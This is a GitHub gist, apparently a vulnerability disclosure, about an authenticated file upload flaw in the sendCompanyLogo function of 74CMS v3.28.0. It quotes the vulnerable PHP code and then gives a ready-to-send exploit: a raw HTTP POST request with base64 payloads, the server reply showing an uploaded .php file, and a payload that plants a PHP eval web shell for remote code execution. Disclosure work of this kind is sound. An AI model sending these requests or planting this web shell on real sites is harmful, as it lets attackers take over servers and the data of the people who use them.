
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Southseast](https://avatars.githubusercontent.com/u/34373144?s=64&v=4)](/Southseast)

# [Southseast](/Southseast)/**[74CMS-v3.28.0-Index.php-File-Upload.md](/Southseast/9f5284d8ee0f6d91e72eef73b285512a)** Secret

Last active
March 21, 2024 13:30

Show Gist options

* [Download ZIP](/Southseast/9f5284d8ee0f6d91e72eef73b285512a/archive/039a14af8a48e7889466a687d513d9ceeda1ca57.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Southseast/9f5284d8ee0f6d91e72eef73b285512a.js&quot;&gt;&lt;/script&gt;
* Save Southseast/9f5284d8ee0f6d91e72eef73b285512a to your computer and use it in GitHub Desktop.

[Code](/Southseast/9f5284d8ee0f6d91e72eef73b285512a)
[Revisions
3](/Southseast/9f5284d8ee0f6d91e72eef73b285512a/revisions)
[Forks
1](/Southseast/9f5284d8ee0f6d91e72eef73b285512a/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Southseast/9f5284d8ee0f6d91e72eef73b285512a.js&quot;&gt;&lt;/script&gt;

Save Southseast/9f5284d8ee0f6d91e72eef73b285512a to your computer and use it in GitHub Desktop.

[Download ZIP](/Southseast/9f5284d8ee0f6d91e72eef73b285512a/archive/039a14af8a48e7889466a687d513d9ceeda1ca57.zip)

74CMS v3.28.0 Index.php File Upload

 [Raw](/Southseast/9f5284d8ee0f6d91e72eef73b285512a/raw/039a14af8a48e7889466a687d513d9ceeda1ca57/74CMS-v3.28.0-Index.php-File-Upload.md)

[**74CMS-v3.28.0-Index.php-File-Upload.md**](#file-74cms-v3-28-0-index-php-file-upload-md)

You can get the latest source code here: <https://www.74cms.com/download/detail/161.html> .

Also, this is the official demo site: <https://74cmsse.tywangcai.com/> .

Fast locate to function: application/v1\_0/controller/company/Index.php#sendCompanyLogo.

```
// 生成企业logo
public function sendCompanyLogo(){
    $imgBase64 = input('post.imgBase64/s','','trim');
    $company_id = 100;

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/',$imgBase64,$res)) {
        //获取图片类型
        $type = $res[2];
        //图片保存路径
        $new_file = "upload/company_logo/".$company_id.'/';
        if (!file_exists($new_file)) {
            mkdir($new_file,0755,true);
        }
        //图片名字
        $new_file = $new_file.time().'.'.$type;
        if (file_put_contents($new_file,base64_decode(str_replace($res[1],'', $imgBase64)))) {
            $id = model('Uploadfile')->insertGetId([
                'save_path' => substr($new_file,6),
                'platform' => 'default',
                'addtime' => time()
            ]);
            $arr = [
                'file_id' => $id,
                'file_url' => config('global_config.sitedomain').'/'.$new_file
            ];
            $this->ajaxReturn(200,'生成成功',$arr);
        } else {
            $this->ajaxReturn(500,'生成失败');
        }
    }
}

```

It is obvious that only passing an imgBase64 parameter with the POST method can complete the malicious file upload, without any waf.

```
imgBase64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==

```

Additionally, this route also has authentication, described in function application/v1\_0/controller/company/Index.php#\_initialize.

```
public function _initialize()
{
    parent::_initialize();
    $this->checkLogin(1);
}
```

Following this checkLogin function, the address is application/v1\_0/controller/common/Base.php.

```
public function checkLogin($need_utype = 0)
{
    if ($need_utype == 0) {
        $code = 50009;
        $tip = '请先登录';
    } else {
        $tip =
            '当前操作需要登录' .
            ($need_utype == 1 ? '企业' : '个人') .
            '会员';
        $code = $need_utype==1?50011:50010;
    }

    if (
        $this->userinfo === null ||
        ($need_utype > 0 && $this->userinfo->utype != $need_utype)
    ) {
        $this->ajaxReturn($code, $tip);
    }
    // ...
}
```

This function requires permission as a company member, but this is very simple because it is a frontend function, and anyone can register as a company member.

It's very clear from the official demo site: <https://74cmsse.tywangcai.com/member/reg/company> that they allow anyone to register as a company user.

So after completing the registration, sending the following EXP can complete the exploit.

```
POST /v1_0/company/index/sendCompanyLogo HTTP/1.1
Host: localhost:7888
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
user-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2215212345678%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ%22%7D
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

imgBase64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```

Then the server will return an uploaded file address, which can be accessed directly.

```
HTTP/1.1 200 OK
Server: nginx/1.19.2
Date: Thu, 07 Mar 2024 13:53:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.1.20
Access-Control-Allow-Origin:
Access-Control-Allow-Methods: POST,OPTIONS,GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: x-requested-with,content-type,x-token,safecode,sessionid,admintoken,user-token,platform,subsiteid
Set-Cookie: qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2215212345678%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ%22%7D; expires=Thu, 14-Mar-2024 13:53:11 GMT; Max-Age=604800; path=/
Content-Length: 141

{"code":200,"message":"生成成功","data":{"file_id":"14","file_url":"http:\/\/localhost:7888\/upload\/company_logo\/100\/1709819591.php"}}
```

Of course, you can replace the above imgBase64, I just used phpinfo() for testing here.

```
# <?php eval($_POST[1]);
imgBase64=data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==

```

In this way, you can achieve RCE.

[![@Southseast](https://avatars.githubusercontent.com/u/34373144?s=80&v=4)](/Southseast)

Copy link

Author

### **[Southseast](/Southseast)** commented [Mar 7, 2024](/Southseast/9f5284d8ee0f6d91e72eef73b285512a?permalink_comment_id=4975417#gistcomment-4975417)

Response:

[![iShot_2024-03-07_22 22 18](https://private-user-images.githubusercontent.com/34373144/310911906-a976a3ab-dd00-4295-bb42-afa2988ac28c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTkyMTYsIm5iZiI6MTczNjU5ODkxNiwicGF0aCI6Ii8zNDM3MzE0NC8zMTA5MTE5MDYtYTk3NmEzYWItZGQwMC00Mjk1LWJiNDItYWZhMjk4OGFjMjhjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDEyMzUxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTE5YjI4MTk1ZWFkYWU5MWE5MzI1ZTRjMDkzZDI4YzExZTc3MjVhYzI2ZDJiZDAwY2MyZjNkMmRmYTQxZDdhNGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.lv_YPlOulJOcIZ6H9G3P_dsbxjURcg4U3vOdgPwmz-0)](https://private-user-images.githubusercontent.com/34373144/310911906-a976a3ab-dd00-4295-bb42-afa2988ac28c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTkyMTYsIm5iZiI6MTczNjU5ODkxNiwicGF0aCI6Ii8zNDM3MzE0NC8zMTA5MTE5MDYtYTk3NmEzYWItZGQwMC00Mjk1LWJiNDItYWZhMjk4OGFjMjhjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDEyMzUxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTE5YjI4MTk1ZWFkYWU5MWE5MzI1ZTRjMDkzZDI4YzExZTc3MjVhYzI2ZDJiZDAwY2MyZjNkMmRmYTQxZDdhNGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.lv_YPlOulJOcIZ6H9G3P_dsbxjURcg4U3vOdgPwmz-0)

Browsing the URL:

[![iShot_2024-03-07_22 11 05](https://private-user-images.githubusercontent.com/34373144/310911879-b78563c3-1493-4b24-ae48-862b02110da0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTkyMTYsIm5iZiI6MTczNjU5ODkxNiwicGF0aCI6Ii8zNDM3MzE0NC8zMTA5MTE4NzktYjc4NTYzYzMtMTQ5My00YjI0LWFlNDgtODYyYjAyMTEwZGEwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDEyMzUxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJmMzgwNDY1ZDExOWU0YTFiYTk5MzMyYTVlMDcxZDExNWM0ZDcyMWM1MzYwZDVjOGVmZDhmNjc4YWFiMzk5YjQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NSxJ0NrQLJJTXjxde2kpfxMI2g-8KXeVdtGbDjDY80w)](https://private-user-images.githubusercontent.com/34373144/310911879-b78563c3-1493-4b24-ae48-862b02110da0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTkyMTYsIm5iZiI6MTczNjU5ODkxNiwicGF0aCI6Ii8zNDM3MzE0NC8zMTA5MTE4NzktYjc4NTYzYzMtMTQ5My00YjI0LWFlNDgtODYyYjAyMTEwZGEwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDEyMzUxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJmMzgwNDY1ZDExOWU0YTFiYTk5MzMyYTVlMDcxZDExNWM0ZDcyMWM1MzYwZDVjOGVmZDhmNjc4YWFiMzk5YjQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NSxJ0NrQLJJTXjxde2kpfxMI2g-8KXeVdtGbDjDY80w)

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FSouthseast%2F9f5284d8ee0f6d91e72eef73b285512a)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

